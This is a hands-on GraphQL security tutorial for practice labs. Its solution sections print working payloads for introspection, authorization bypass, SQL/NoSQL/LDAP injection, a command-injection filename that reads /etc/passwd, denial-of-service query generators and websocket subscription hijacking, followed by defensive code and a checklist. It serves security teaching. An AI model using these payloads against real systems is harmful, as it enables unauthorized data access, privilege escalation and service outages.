# 🔀 GraphQL Security Tutorial

**Difficulty**: ⭐⭐⭐⭐ (Intermediate)  
**Time Required**: 2-3 hours  
**Applications**: GraphQL Security Lab, Juice Shop, DVGA

## 📚 Table of Contents
1. [What is GraphQL?](#what-is-graphql)
2. [GraphQL Security Risks](#graphql-security-risks)
3. [Common Vulnerabilities](#common-vulnerabilities)
4. [Hands-On Practice](#hands-on-practice)
5. [Defense Strategies](#defense-strategies)
6. [Additional Resources](#additional-resources)

---

## 🎯 Learning Objectives

By the end of this tutorial, you will:
- ✅ Understand GraphQL architecture and queries
- ✅ Identify GraphQL security vulnerabilities
- ✅ Exploit introspection, injection, and authorization flaws
- ✅ Perform denial of service attacks
- ✅ Implement GraphQL security best practices

---

## What is GraphQL?

GraphQL is a query language for APIs that allows clients to request exactly what data they need. Unlike REST APIs with fixed endpoints, GraphQL provides a single endpoint with flexible queries.

### 🎬 Real-World Impact

GraphQL vulnerabilities have affected:
- **Facebook (2018)**: Information disclosure via introspection
- **GitLab (2021)**: GraphQL authorization bypass - $20,000 bounty
- **Shopify (2019)**: DoS via nested queries
- **New Relic (2020)**: IDOR through GraphQL mutations

### 🔍 GraphQL vs REST

| REST | GraphQL |
|------|---------|
| Multiple endpoints | Single endpoint |
| Fixed data structure | Flexible queries |
| Over/under-fetching | Precise data fetching |
| HTTP methods (GET, POST, etc.) | Query/Mutation/Subscription |

---

## GraphQL Security Risks

### Unique Attack Surface

1. **Introspection Queries**: Schema discovery
2. **Query Complexity**: DoS via deep nesting
3. **Authorization Flaws**: Field-level access control
4. **Injection Attacks**: In arguments and directives
5. **Batching Attacks**: Multiple operations

### Query Structure

```graphql
# Basic query
query {
  user(id: "123") {
    name
    email
    posts {
      title
      content
    }
  }
}

# Mutation
mutation {
  createUser(input: {name: "Alice", email: "alice@example.com"}) {
    id
    name
  }
}
```

---

## Common Vulnerabilities

### 1. Information Disclosure via Introspection
Discovering the entire API schema

### 2. Authorization Bypass
Accessing unauthorized fields or mutations

### 3. SQL/NoSQL Injection
Through query arguments

### 4. Denial of Service
Deep query nesting or expensive operations

### 5. CSRF in Mutations
State-changing operations without protection

### 6. Batching Attacks
Brute force or rate limit bypass

---

## Hands-On Practice

### 🏃 Exercise 1: GraphQL Introspection

**Setup**: GraphQL endpoint with introspection enabled  
**Goal**: Discover the complete API schema

<details>
<summary>💡 Hint 1: Find the GraphQL endpoint</summary>

Common GraphQL endpoints:
- `/graphql`
- `/api/graphql`
- `/v1/graphql`
- `/query`

Look for:
- `Content-Type: application/json`
- Query structure in requests
- "query" or "mutation" in POST body

</details>

<details>
<summary>💡 Hint 2: Introspection query</summary>

GraphQL has a built-in introspection system:
```graphql
{
  __schema {
    types {
      name
    }
  }
}
```

But you probably want more details!

</details>

<details>
<summary>💡 Hint 3: Full introspection</summary>

Use a complete introspection query to get:
- All types
- All fields
- All arguments
- Descriptions

Tools can help automate this!

</details>

<details>
<summary>🔓 Solution</summary>

**Method 1: Basic introspection**
```graphql
# Get all types
query {
  __schema {
    types {
      name
      kind
      description
    }
  }
}

# Get queries and mutations
query {
  __schema {
    queryType {
      fields {
        name
        description
        args {
          name
          type {
            name
          }
        }
      }
    }
    mutationType {
      fields {
        name
      }
    }
  }
}
```

**Method 2: Full introspection query**
```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

**Method 3: Using tools**
```bash
# GraphQL Voyager
# Online: https://apis.guru/graphql-voyager/

# Using curl
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'

# Using graphql-path-enum
graphql-path-enum -i introspection.json -t User

# Using InQL Burp Extension
# Automatically extracts schema
```

**What to look for**:
- User types with sensitive fields
- Admin-only mutations
- Deprecated fields (might have weaker security)
- Custom scalar types (might have injection flaws)

</details>

---

### 🏃 Exercise 2: Authorization Bypass

**Setup**: GraphQL API with field-level authorization  
**Goal**: Access admin-only fields and mutations

<details>
<summary>💡 Hint 1: Identify restricted fields</summary>

From introspection, look for:
- Fields with "admin" or "private" in the name
- User type with role/permission fields
- Mutations like deleteUser, updateRole

Try accessing them as a regular user!

</details>

<details>
<summary>💡 Hint 2: Alias technique</summary>

GraphQL aliases let you rename fields:
```graphql
query {
  publicData: user(id: "1") {
    name
  }
  privateData: user(id: "1") {
    salary
    ssn
  }
}
```

Sometimes aliasing bypasses field-level checks!

</details>

<details>
<summary>💡 Hint 3: Fragment exploitation</summary>

Fragments might bypass authorization:
```graphql
fragment AllFields on User {
  name
  email
  role
  salary
}

query {
  user(id: "1") {
    ...AllFields
  }
}
```

</details>

<details>
<summary>🔓 Solution</summary>

**Method 1: Direct field access**
```graphql
# As regular user, try accessing admin fields
query {
  user(id: "1") {
    id
    name
    email
    # Try these even if not shown to your role:
    role
    permissions
    salary
    socialSecurityNumber
    apiKey
  }
}
```

**Method 2: Using aliases**
```graphql
query {
  # Bypass field-level authorization
  me: user(id: "MY_ID") {
    name
  }
  # Access another user's data
  admin: user(id: "ADMIN_ID") {
    name
    email
    password  # Sometimes exposed!
    role
    permissions
  }
}
```

**Method 3: Mutations authorization bypass**
```graphql
# Try admin mutations
mutation {
  promoteToAdmin(userId: "MY_ID") {
    id
    role
  }
}

mutation {
  deleteUser(id: "OTHER_USER") {
    success
  }
}

# Parameter manipulation
mutation {
  updateUser(
    id: "MY_ID", 
    data: {
      name: "New Name",
      role: "ADMIN"  # Try adding unauthorized fields
    }
  ) {
    id
    role
  }
}
```

**Method 4: Query batching for IDOR**
```graphql
query {
  user1: user(id: "1") { ...UserInfo }
  user2: user(id: "2") { ...UserInfo }
  user3: user(id: "3") { ...UserInfo }
  # ... enumerate many users
}

fragment UserInfo on User {
  id
  email
  name
  createdAt
  lastLogin
}
```

</details>

---

### 🏃 Exercise 3: GraphQL Injection

**Setup**: GraphQL API with SQL/NoSQL backend  
**Goal**: Exploit injection vulnerabilities in query arguments

<details>
<summary>💡 Hint 1: Identify injection points</summary>

Look for:
- String arguments (search, filter, name)
- Arguments used in WHERE clauses
- Custom scalar types

Test with SQL injection payloads!

</details>

<details>
<summary>💡 Hint 2: GraphQL argument injection</summary>

Unlike REST, GraphQL arguments are structured:
```graphql
query {
  users(filter: "name LIKE '%admin%'") {
    name
  }
}
```

Try breaking out of the expected format!

</details>

<details>
<summary>💡 Hint 3: NoSQL injection</summary>

For MongoDB/NoSQL backends:
```graphql
query {
  user(username: {"$ne": null}) {
    id
  }
}
```

JSON injection in arguments!

</details>

<details>
<summary>🔓 Solution</summary>

**SQL Injection**:
```graphql
# Basic SQL injection test
query {
  users(search: "' OR '1'='1") {
    id
    email
  }
}

# Union-based injection
query {
  products(filter: "') UNION SELECT null,email,password FROM users--") {
    name
    description
  }
}

# Time-based blind injection
query {
  user(id: "1' AND SLEEP(5)--") {
    name
  }
}
```

**NoSQL Injection**:
```graphql
# MongoDB injection
query {
  users(filter: "{\"$where\": \"this.password.match(/^a/)\"}") {
    username
  }
}

# Bypass authentication
query {
  login(
    username: "admin",
    password: {"$ne": null}
  ) {
    token
  }
}
```

**LDAP Injection**:
```graphql
query {
  users(filter: "*)(uid=*))(|(uid=*") {
    name
    email
  }
}
```

**Command Injection**:
```graphql
mutation {
  generateReport(
    filename: "report.pdf; cat /etc/passwd > /tmp/leak.txt"
  ) {
    success
  }
}
```

**Advanced: GraphQL query injection**:
```graphql
# If the backend constructs GraphQL queries
mutation {
  updateProfile(
    bio: "Hi\"}{deleteAllUsers{success}}#"
  ) {
    success
  }
}
```

</details>

---

### 🏃 Exercise 4: Denial of Service Attacks

**Setup**: GraphQL API without query depth limiting  
**Goal**: Create expensive queries that consume server resources

<details>
<summary>💡 Hint 1: Deep nesting</summary>

GraphQL allows nested queries:
```graphql
query {
  thread {
    messages {
      user {
        friends {
          posts {
            comments {
              # Keep going...
            }
          }
        }
      }
    }
  }
}
```

How deep can you go?

</details>

<details>
<summary>💡 Hint 2: Circular references</summary>

Some schemas have circular relationships:
- User → Posts → Author (User) → Posts...
- Thread → Messages → Thread...

Exploit these loops!

</details>

<details>
<summary>💡 Hint 3: Alias explosion</summary>

Use aliases to multiply operations:
```graphql
query {
  a1: expensiveOperation
  a2: expensiveOperation
  a3: expensiveOperation
  # ... thousands more
}
```

</details>

<details>
<summary>🔓 Solution</summary>

**Method 1: Deep query attack**
```graphql
query DeepQuery {
  thread(id: "1") {
    messages {
      user {
        posts {
          comments {
            author {
              friends {
                posts {
                  comments {
                    author {
                      friends {
                        posts {
                          comments {
                            # 10+ levels deep
                            content
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

**Method 2: Width attack with aliases**
```python
# Generate massive query
query = "query {\n"
for i in range(10000):
    query += f"  a{i}: __typename\n"
query += "}"

# Or expensive operations
query = "query {\n"
for i in range(1000):
    query += f"  user{i}: user(id: \"{i}\") {{ posts {{ comments {{ content }} }} }}\n"
query += "}"
```

**Method 3: Circular query**
```graphql
query CircularDoS {
  post(id: "1") {
    author {
      posts {
        author {
          posts {
            author {
              posts {
                author {
                  posts {
                    # Creates exponential load
                    title
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

**Method 4: Resource-intensive operations**
```graphql
query {
  # Request large datasets
  allUsers(limit: 999999) {
    id
    name
    email
    posts {
      title
      content
      comments {
        text
      }
    }
  }
}

# Or computationally expensive
mutation {
  analyzeData(
    input: {
      data: "VERY_LARGE_BASE64_STRING",
      iterations: 1000000
    }
  ) {
    result
  }
}
```

**Method 5: Batched query attack**
```json
[
  {"query": "query { expensiveOperation }"},
  {"query": "query { expensiveOperation }"},
  // ... 1000 queries in one request
]
```

</details>

---

### 🏃 Challenge: Advanced GraphQL Exploitation

**Goal**: Chain multiple vulnerabilities for maximum impact

<details>
<summary>🎯 Challenge Overview</summary>

Combine techniques:
1. Use introspection to map the API
2. Find authorization flaws
3. Exploit injections
4. Escalate privileges
5. Exfiltrate data

</details>

<details>
<summary>💡 Hint: Subscription abuse</summary>

GraphQL subscriptions maintain persistent connections:
```graphql
subscription {
  messageAdded(chatroomId: "PRIVATE_ROOM") {
    content
    user {
      name
    }
  }
}
```

Can you subscribe to private data?

</details>

<details>
<summary>🔓 Solution</summary>

**Full attack chain**:

**Step 1: Schema reconnaissance**
```graphql
# Find all mutations
query {
  __type(name: "Mutation") {
    fields {
      name
      args {
        name
        type {
          name
        }
      }
    }
  }
}
```

**Step 2: Find vulnerable mutation**
```graphql
# Discover internal mutation
mutation {
  _debug_setUserRole(userId: "MY_ID", role: "ADMIN") {
    success
  }
}
```

**Step 3: Exploit race condition**
```python
import asyncio
import aiohttp

async def race_condition():
    # Simultaneously: use discount + change quantity
    tasks = [
        apply_discount("PROMO50"),
        update_quantity(1000),
        checkout()
    ]
    await asyncio.gather(*tasks)
```

**Step 4: Data exfiltration via error messages**
```graphql
query {
  user(id: "1' AND (SELECT password FROM users WHERE id=1) LIKE 'a%'--") {
    name
  }
}
# Binary search through error timing/messages
```

**Step 5: Websocket subscription hijacking**
```javascript
// Subscribe to all private channels
const ws = new WebSocket('ws://target/graphql');
ws.send(JSON.stringify({
  type: 'connection_init'
}));

// Subscribe to admin notifications
ws.send(JSON.stringify({
  type: 'start',
  payload: {
    query: `subscription {
      adminNotifications {
        message
        sensitiveData
      }
    }`
  }
}));
```

</details>

---

## Defense Strategies

### 🛡️ GraphQL Security Best Practices

**1. Disable Introspection in Production**
```javascript
const server = new GraphQLServer({
  schema,
  introspection: process.env.NODE_ENV === 'development',
  playground: process.env.NODE_ENV === 'development'
});
```

**2. Implement Query Depth Limiting**
```javascript
const depthLimit = require('graphql-depth-limit');

const server = new GraphQLServer({
  schema,
  validationRules: [depthLimit(5)]
});
```

**3. Query Cost Analysis**
```javascript
const costAnalysis = require('graphql-cost-analysis');

const server = new GraphQLServer({
  schema,
  validationRules: [
    costAnalysis({
      maximumCost: 1000,
      defaultCost: 1,
      scalarCost: 1,
      objectCost: 2,
      listFactor: 10
    })
  ]
});
```

**4. Field-Level Authorization**
```javascript
const resolvers = {
  User: {
    email: (parent, args, context) => {
      // Check authorization
      if (context.user.id !== parent.id && !context.user.isAdmin) {
        throw new ForbiddenError('Not authorized');
      }
      return parent.email;
    },
    
    salary: requireRole('ADMIN', (parent) => parent.salary)
  }
};
```

**5. Rate Limiting**
```javascript
const rateLimit = require('express-rate-limit');

app.use('/graphql', rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // limit each IP to 100 requests per windowMs
  message: 'Too many requests'
}));
```

### 🛡️ Input Validation

```javascript
const { GraphQLScalarType } = require('graphql');

const EmailType = new GraphQLScalarType({
  name: 'Email',
  serialize: value => value,
  parseValue: value => {
    if (!isValidEmail(value)) {
      throw new Error('Invalid email');
    }
    return value;
  },
  parseLiteral: ast => {
    if (!isValidEmail(ast.value)) {
      throw new Error('Invalid email');
    }
    return ast.value;
  }
});
```

---

## 📊 GraphQL Security Checklist

### Query Security
- [ ] Introspection disabled in production
- [ ] Query depth limiting implemented
- [ ] Query complexity analysis
- [ ] Timeout for long-running queries
- [ ] Rate limiting per user/IP

### Authorization
- [ ] Field-level authorization
- [ ] Mutation authorization
- [ ] Subscription authorization
- [ ] No authorization bypass via aliases
- [ ] Proper CORS configuration

### Input Validation
- [ ] Input sanitization
- [ ] Type validation
- [ ] Size limits on arguments
- [ ] Whitelist allowed characters
- [ ] Prevent nested input abuse

---

## 🏆 Skill Check

Before moving on, make sure you can:

- [ ] Perform GraphQL introspection
- [ ] Identify authorization vulnerabilities
- [ ] Exploit GraphQL injection flaws
- [ ] Create DoS queries
- [ ] Implement security controls

---

## Additional Resources

### 🔧 Tools
- **GraphQL Voyager**: Interactive schema exploration
- **InQL**: Burp Suite extension for GraphQL
- **GraphQL Raider**: Another Burp extension
- **graphql-path-enum**: Find paths between types
- **BatchQL**: GraphQL batching attack tool

### 📖 Further Reading
- [GraphQL Security Best Practices](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
- [Discovering GraphQL Endpoints](https://blog.assetnote.io/2021/08/29/contextual-content-discovery/)
- [GraphQL Security Guide](https://graphql.org/learn/security/)

### 🎥 Video Resources
- [OWASP GraphQL Security](https://www.youtube.com/watch?v=OQCgmftU-Og)
- [Hacking GraphQL](https://www.youtube.com/watch?v=oJvjTru8XYI)

---

**Next Tutorial**: [Rate Limiting & DoS](rate-limiting.md) → 